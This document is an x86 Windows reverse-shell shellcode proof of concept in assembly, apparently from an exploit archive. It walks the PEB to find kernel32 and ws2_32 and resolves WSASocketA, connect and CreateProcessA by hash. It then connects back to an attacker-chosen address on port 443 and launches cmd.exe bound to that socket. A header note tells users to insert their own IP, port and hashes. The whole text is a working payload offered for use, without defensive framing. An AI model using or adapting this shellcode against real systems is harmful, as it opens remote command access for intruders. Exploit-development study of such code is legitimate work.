# Shellcode Title: Windows/x86 - Reverse Shell + Position-Independent-Code (PIC) + Null-Free Shellcode (231 Bytes)
# Shellcode Author: @TheCyberBepop, Shadi Habbal (@Kerpanic)
# Date: 2020-07-01
# Technique: PEB & Export Table Directory
# Tested On: Windows 10 Professional (x86) 10.0.16299 Build 16299
# Assumptions: Application should already have ws2_32.dll loaded if sending the payload to a windows socket
# Note: Remember to update the hash values, port, and IP address in this PoC to whatever you are using!

    start:                             
        mov ebp, esp                    ; Create new stack frame
        push eax                        ; Add stack space -- required for KERNEL32.dll DllBase
        push eax                        ; Add stack space -- AddressOfNames VMA

    find_kernel32:                     
        xor ecx, ecx                    ; ECX = 0
        mov eax, fs:[ecx + 0x30]        ; EAX = PEB (ECX used to remove NULLs)
        mov eax, [eax + 0xC]            ; ESI = PEB->Ldr
        mov esi, [eax + 0x14]           ; ESI = PEB->Ldr.InMemOrder (program module)
        lodsd                           ; EAX = [ESI] (ntdll.dll)
        xchg eax, esi                   ; ESI = EAX
        lodsd                           ; EAX = [ESI] (KERNEL32.dll)
        mov ebx, [eax + 0x10]           ; EBX = DllBase KERNEL32.dll (EAX - 0x8 + 0x18)
        mov [ebp - 0x4], ebx            ; Save KERNEL32.dll DllBase to the stack

    find_ws2_32:                       
        xchg eax, esi                   ; ESI = EAX (current module)
        lodsd                           ; EAX = [ESI] (next module)
        mov ebx, [eax + 0x28]           ; EBX = BaseDllName
        cmp byte ptr [ebx + 3*2], 0x5F  ; 4th letter match "_" -- risky, assumes no other module's 4th character will be a "_"
        jne find_ws2_32                 ; Jump if not ws2_32.dll
        mov ebx, [eax + 0x10]           ; EBX = DllBase ws2_32.dll (EAX - 0x8 + 0x18)

    jmp call_wsasocketa                 ; Jump to call_wsasocketa

    ; EBX = ws2_32.dll DllBase

    find_function_start:               
        mov eax, [ebx + 0x3c]           ; EAX = DOS->e_lfanew
        mov edi, [ebx + eax + 0x78]     ; EDI = Export Table Directory RVA (0x18 + 0x60)
        add edi, ebx                    ; EDI = Export Table Directory VMA
        mov ecx, [edi + 0x18]           ; ECX = NumberOfNames
        mov esi, [edi + 0x20]           ; ESI = AddressOfNames RVA
        add esi, ebx                    ; ESI = AddressOfNames VMA
        mov [ebp - 0x8], esi            ; Save AddressOfNames VMA

    ; ECX = NumberOfNames
    ; EDI = Export Table Directory VMA
    ; ESI = AddressOfNames VMA

    find_function:                     
        jecxz find_function_finished    ; Jump to find_function_finished when ECX = 0
        dec ecx                         ; Decrement NumberOfNames
        mov esi, [ebp - 0x8]            ; ESI = AddressOfNames VMA
        mov esi, [esi + ecx * 4]        ; ESI = Symbol RVA
        add esi, ebx                    ; ESI = Symbol VMA

    ; ECX = NumberOfNames
    ; ESI = Symbol VMA

    prepare_compute_hash:              
        xor eax, eax                    ; EAX = 0
        cdq                             ; EDX = 0
        cld                             ; Clear direction

    compute_hash:                      
        lodsb                           ; Load the next byte from ESI into AL
        test al, al                     ; Check for NULL terminator
        jz find_function_compare        ; Once ZF is set -- we hit the NULL terminator
        ror edx, 0x0d                   ; Rotate EDX 13 bites to the right
        add edx, eax                    ; Add the new byte to the accumulator
        jmp compute_hash                ; Next iteration

    ; ECX = NumberOfNames
    ; EDX = Symbol Hash

    find_function_compare:             
        cmp edx, [esp + 0x4]            ; Compare the computed hash with the requested hash
        jnz find_function               ; If it doesn't match go back to find_function
        mov esi, [edi + 0x24]           ; ESI = AddressOfNameOrdinals RVA
        add esi, ebx                    ; ESI = AddressOfNameOrdinals VMA
        mov cx, [esi + ecx * 2]         ; ECX = Extrapolate the function's ordinal
        mov esi, [edi + 0x1c]           ; ESI = AddressOfFunctions RVA
        add esi, ebx                    ; ESI = AddressOfFunctions VMA
        mov edx, [esi + ecx * 4]        ; EDX = Current Function RVA
        add edx, ebx                    ; EDX = Current Function VMA

    ; EDX = Current Function VMA

    find_function_finished:            
        pop edi                         ; EDI = Callers return address
        pop ecx                         ; ECX = Junk
        call edx                        ; Call function
        push edi                        ; Push the callers return address back to the Stack
        ret                             ; Return to the caller

    ; EBX = ws2_32.dll DllBase
    ; ECX = 0

    call_wsasocketa:                   
        push ecx                        ; Push dwFlags
        push ecx                        ; Push g
        push ecx                        ; Push lpProtocolInfo
        push ecx                        ; Push protocol -- can be NULL per MSDN (service provider will choose the protocol to use)
        push 0x1                        ; Push type -- 0x1 (SOCK_STREAM)
        push 0x2                        ; Push af -- 0x02 (AF_INET)
        push 0xadf509d9                 ; WSASocketA() hash
        call find_function_start        ; Call find_function_start

    ; EAX = SOCKET descriptor
    ; EBX = ws2_32.dll DllBase

    call_connect:                      
        push eax                        ; Push hStdError (SOCKET descriptor) for create_startupinfoa
        push eax                        ; Push hStdOutput (SOCKET descriptor) for create_startupinfoa
        push eax                        ; Push hStdInput (SOCKET descriptor) for create_startupinfoa
        cdq                             ; EDX = 0 (since EAX contains a descriptor it is assumed the sign bit is NOT set)
        push edx                        ; Push sin_zero[] (must be 0)
        push edx                        ; Push sin_zero[] (must be 0)
        push 0xXXXXa8c0                 ; Push sin_addr (192.168.X.X)
        mov edi, 0x44fefffd             ; EDI = sin_port and sin_family (avoid NULL)
        not edi                         ; 0xbb010002 -- sin_port 0xbb01 (443) and 0x2 (sin_family & AF_INET)
        push edi                        ; push sin_port and sin_family
        push esp                        ; Push pointer to the sockaddr_in structure
        pop edi                         ; EDI = Pointer to the sockaddr_in structure
        push 0x10                       ; Push namelen (size of sockaddr_in structure)
        push edi                        ; Push *name
        push eax                        ; Push s
        push 0x60aaf9ec                 ; connect() hash
        call find_function_start        ; Call find_function_start

    ; EAX = 0
    ; EDX = 0

    create_startupinfoa:               
        add esp, 0x10                   ; Return the Stack to our 3 previous SOCKET descriptor pushes
        push edx                        ; Push lpReserved2 (NULL)
        push edx                        ; push cbReserved2 & wShowWindow (NULL)
        mov dl, 0xff                    ; DL = 0xff
        inc edx                         ; EDX = 0x100
        push edx                        ; Push dwFlags
        cdq                             ; EDX = 0 (sign bit is NOT set since EAX should be NULL from successful connect)
        push 0xa                        ; Setup our loop counter
        pop ecx                         ; ECX = 0xa (10)
      startupinfoa_loop:                 
        push edx                        ; Push dwFillAttribute through lpReserved
        loop startupinfoa_loop          ; Loop until ECX = 0
        push 0x44                       ; Push cb
        push esp                        ; Push pointer to the STARTUPINFOA structure
        pop edi                         ; EDI = Pointer to STARTUPINFOA

    create_cmd_string:                 
        mov eax, 0x646d6341             ; EAX = Acmd
        shr eax, 8                      ; EAX = cmd
        push eax                        ; Push cmd onto the Stack
        push esp                        ; Push pointer to the cmd string
        pop ebx                         ; EBX = pointer to the cmd string

    ; EBX = pointer to the cmd string
    ; EDX = 0

    call_createprocess:                
        lea eax, [esp - 0x10]           ; Create stack space -- update to 16????
        push eax                        ; Push lpProcessInformation
        push edi                        ; Push lpStartupInfo
        push edx                        ; Push lpCurrentDirectory
        push edx                        ; Push lpEnvironment
        push edx                        ; Push dwCreationFlags
        push 0x1                        ; Push bInheritHandles 0x01 (TRUE)
        push edx                        ; Push lpThreadAttributes
        push edx                        ; Push lpProcessAttributes
        push ebx                        ; Push lpCommandLine
        push edx                        ; Push lpApplicationName
        push 0x16b3fe72                 ; CreateProcessA hash
        mov ebx, [ebp - 0x4]            ; Restore KERNEL32.dll DllBase
        call find_function_start        ; Call find_function_start

    ; Only required if you care about the application crashing -- adds 10 bytes
    ;exit:
    ; Use whatever is on the stack for uExitCode -- don't care about exit code
    ;    push 0x73e2d87e                 ; ExitProcess() hash
    ;    call find_function_start        ; Call find_function_start